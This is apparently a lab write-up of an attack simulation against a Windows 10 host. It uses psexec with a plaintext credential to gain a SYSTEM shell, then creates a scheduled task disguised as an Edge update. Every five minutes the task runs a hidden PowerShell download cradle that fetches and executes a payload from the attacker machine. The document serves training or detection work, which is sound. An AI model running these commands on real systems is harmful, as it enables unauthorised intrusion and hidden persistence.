# 02 — Attack Simulation (Kali, 192.168.100.106 / BUTCH)

## Step 1 — Foothold: SYSTEM shell via psexec

```bash
impacket-psexec adminlab:'P@ssw0rd'@192.168.100.108
```
Result: v0.14.0 — found writable ADMIN$, uploaded `TVMxBfgf.exe`, opened SVCManager, created/started service `rPEs` → `C:\Windows\system32>` shell as SYSTEM. Windows 10.0.19045.2846.
📸 `evidence/01-kali-psexec-shell.png`

## Step 2 — Create masqueraded hidden scheduled task (persistence)

```cmd
schtasks /create /tn "MicrosoftEdgeUpdateTask" /tr "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.106/payload.ps1')\"" /sc minute /mo 5 /ru SYSTEM /f
```
→ `SUCCESS: The scheduled task "MicrosoftEdgeUpdateTask" has successfully been created.`
Masquerading: task name mimics a legitimate Edge update. Flags: `-nop -w hidden` (no profile, hidden window), `/ru SYSTEM` (highest privilege), `/sc minute /mo 5` (every 5 min = persistent beacon).
📸 `evidence/02-kali-schtasks-create.png`

## Step 3 — Verify the task

```cmd
schtasks /query /tn "MicrosoftEdgeUpdateTask" /v /fo list | findstr /i "TaskName TaskToRun RunAs State Schedule Next"
```
→ TaskName `\MicrosoftEdgeUpdateTask`, State **Enabled**, Run As User **SYSTEM**, Schedule Type: Minute (every 5).
📸 `evidence/03-kali-schtasks-query.png`

## Step 4 — Trigger manually (prove execution)

```cmd
schtasks /run /tn "MicrosoftEdgeUpdateTask"
```
→ `SUCCESS: Attempted to run the scheduled task "MicrosoftEdgeUpdateTask".` (payload IEX cradle fires; Kali HTTP server logs GET /payload.ps1.)
📸 `evidence/04-kali-schtasks-run.png`

## Step 5 — Cleanup (lab)

```cmd
schtasks /delete /tn "MicrosoftEdgeUpdateTask" /f
```
→ `SUCCESS: The scheduled task was successfully deleted.`
📸 `evidence/06-kali-schtasks-delete.png`
